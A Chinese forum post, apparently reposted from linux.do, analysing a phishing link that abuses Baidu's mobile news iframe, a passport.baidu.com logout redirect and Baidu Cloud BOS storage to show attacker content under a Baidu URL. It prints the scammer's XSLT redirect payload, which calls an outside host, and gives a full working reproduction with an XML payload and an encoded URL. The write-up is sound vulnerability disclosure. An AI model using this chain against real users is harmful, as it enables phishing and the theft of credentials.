- **场景介绍**
骗子给了一个网站诱导访问，链接很长，看开头是百度的官方链接，`https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail`  所以安全意识不强的肯定以为是安全的网站，然后点进去后就中招了

- **名词解释**
这种漏洞允许攻击者构造一个看似合法的URL（例如 `https://a.com/url=https://b.com` ），但实际上会显示来自另一个不受信任的网站（如 `https://b.com` ）的内容，而用户的浏览器地址栏中显示的仍然是原网站的URL (`https://a.com` )。

- 攻击者可以利用这种漏洞来实施钓鱼攻击，让用户相信他们正在访问一个可信网站，而实际上他们正在与一个恶意网站交互。

- **漏洞的影响**
- 钓鱼攻击：攻击者可以创建看似可信的URL，但实际上这些URL会重定向到钓鱼网站，这些网站可能会窃取用户的敏感信息，如密码和个人数据。
- 安全绕过：用户可能会被重定向去下载恶意软件或其他有害内容，却误以为这些内容来自可信的来源。
个人分析
- 骗子链接如下

[https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail={“linkData”:{“name”:“iframe/mib-iframe”,“url”:“https://passport.baidu.com/?logout=&aid=7&u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F”}} 45](https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%22linkData%22:%7B%22name%22:%22iframe/mib-iframe%22,%22url%22:%22https://passport.baidu.com/?logout=&aid=7&u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F%22%7D%7D)

```
{
    "linkData": {
        "name": "iframe/mib-iframe",
        "url": "https://passport.baidu.com/?logout=&aid=7&u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F"
    }
}
```
> 这个应该是百度新闻（百家号）的一个页面，原本应该是百度引用自己家网站其他页面的信息所用。

> 页面中iframe链接被替换成了骗子自己的网站（现在钓鱼网站已被删除，现在显示404）。

- linkData中的url

[https://passport.baidu.com/?logout=&aid=7&u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F 17](https://passport.baidu.com/?logout=&aid=7&u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F)

- 这个应该是百度的退出链接，退出登录后跳转到 https://data5678.bj.bcebos.com/ 这个域名（后面带的data参数不重要，后来发现是骗子用来识别从哪里跳转过来然后给什么地址的参数）。

- 尝试替换其他域名均跳转到 `baidu.com` 百度首页，这个域名其实是百度云对象存储BOS的域，在百度自家白名单内。

- 页面内容

```
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml">
    <xsl:template match="/">
        <html>
            <head>
                <title>...</title>
                <meta content="always" name="referrer"/>
            </head>
            <body>
                <script><![CDATA[
                    document.addEventListener("DOMContentLoaded", function() {
                        processData();
                    });

                    function processData() {
                        var data = decodeURIComponent(window.location.search.substr(1)); // 解码URL参数
                        // 只在调用后端接口时在sbm后追加/time
                        var apiEndpoint = 'https://book.muzhix.cn/rpa.php';
                        data = data.split('data=')[1];
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', apiEndpoint + '?data=' + data, true);
                        xhr.onreadystatechange = function () {
                            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                                var responseData = JSON.parse(xhr.responseText);
                                window.location.href = responseData.data;
                            }
                        };
                        xhr.send();
                    }
                ]]></script>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>

```
- 看不太懂前后的xml，丢给AI解释。
```
这个 XSLT 样式表是用来将 XML 输入转换成 HTML 页面的。
页面中包含 JavaScript 代码，用于处理 URL 参数并使用 AJAX 向服务器端脚本发送请求。
```

- 最后是用xhr请求数据，拼接链接 window.location.href 替换掉iframe的链接。
实现内容的替换。

- 漏洞复现
- 注册百度云对象存储BOS。

- 新建存储桶，地域随便，读写权限为公共读。
创建的北京节点一直上传失败，只能换一个广州的了，

- 修改代码，其他不要直接替换链接

```
<html>
    <head>
        <title>...</title>
        <meta content="always" name="referrer"/>
    </head>
    <body>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                processData();
            });

            function processData() {
                var url = 'https://linux.do/u/k452b';
                window.location.href = url;
            }
        </script>
    </body>
</html>

```
- 上传后，发现死活无法访问只能下载，抓包查看响应头被加上了 `Content-Disposition:'attachment=filename;` 所以只能下载。

遂找到 `储存桶设置 – 配置管理 – 静态网站托管` 打开，但也失败，始终是下载。

![转载](https://linux.do/uploads/default/original/3X/0/f/0fb65f0f4b9aac6e9b276e7389858e7816cf5d1f.png)

打开文档阅读说明如下：只要是以官方域访问html的，均为下载形式。

![转载](https://linux.do/uploads/default/original/3X/4/c/4c8d40b54b3019e525d8a7566b7fe157963eb80d.png)

- 重新抓包骗子的网页，发现`Content-Type: text/xml`，难道格式是xml？也难怪前后都是xml标签。
- 重新整，修改代码后，把格式改为xml重新上传，打开百度云提供的域名成功跳转到 `https://linux.do/u/k452b`
```
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml">
    <xsl:template match="/">
        <html>
            <head>
                <title>...</title>
                <meta content="always" name="referrer"/>
            </head>
            <body>
                <script><![CDATA[
                    document.addEventListener("DOMContentLoaded", function() {
                        processData();
                    });

                    function processData() {
                        var url = 'https://linux.do/u/k452b';
                        window.location.href = url
                    }
                ]]></script>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>

```
- 重新整理拼接url，访问后iframe中提示linux.do拒绝了我们的请求。
![转载](https://linux.do/uploads/default/original/3X/f/2/f23af41551aa21e213474ff404cc944d335600fc.png)

- 抓包看是同源策略导致无法显示，换一个没有同源策略的网站后成功显示网站。

![转载](https://linux.do/uploads/default/original/3X/b/a/baf3ee1162f024311f93b5a8140f6cb363f7714e.png)
- 域名不变，iframe框架内容被替换。

![转载](https://linux.do/uploads/default/original/3X/7/2/726fc1a53cba75bd7941968bef71ddb20d2d5996.jpeg)


![转载](https://linux.do/uploads/default/original/3X/9/e/9e7bfe50ad803f19f4f4e369aed74f2e37e5c42a.jpeg)

- 完整链接
 url编码后

[https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%2522linkData%2522%253A%7B%2522name%2522%253A%2522iframe%252Fmib-iframe%2522%252C%2522url%2522%253A%2522https%253A%252F%252Fpassport.baidu.com%252F%253Flogout%253D%2526aid%253D7%2526u%253Dhttps%253A%252F%252Flinuxdo.gz.bcebos.com%252Flinuxdo.xml%2522%7D%7D 86](https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%2522linkData%2522%253A%7B%2522name%2522%253A%2522iframe%252Fmib-iframe%2522%252C%2522url%2522%253A%2522https%253A%252F%252Fpassport.baidu.com%252F%253Flogout%253D%2526aid%253D7%2526u%253Dhttps%253A%252F%252Flinuxdo.gz.bcebos.com%252Flinuxdo.xml%2522%7D%7D)

- 总结
这个链接利用了百度内部的一些机制，如 iframe 的加载方式和 URL 参数的处理。

绕过iframe域名白名单

攻击者找到了一种方法，即使用百度自己的域名（如百度云对象存储 BOS 的域名 `bj.bcebos.com` 或 `gz.bcebos.com`）来加载恶意内容。
由于这些域名属于百度内部，攻击者通过这些域名上传恶意内容，从而绕过了白名单机制。
在百度云对象储存BOS中

攻击者发现了通过上传 XML 文件绕过HTML文件的限制，XML 文件被浏览器解析为HTML网页并执行其中的JS代码。
这种方法利用了浏览器对 XML 的默认处理方式，即作为文本类型解析，而不是强制下载。




**本文转自 https://linux.do/t/topic/168244**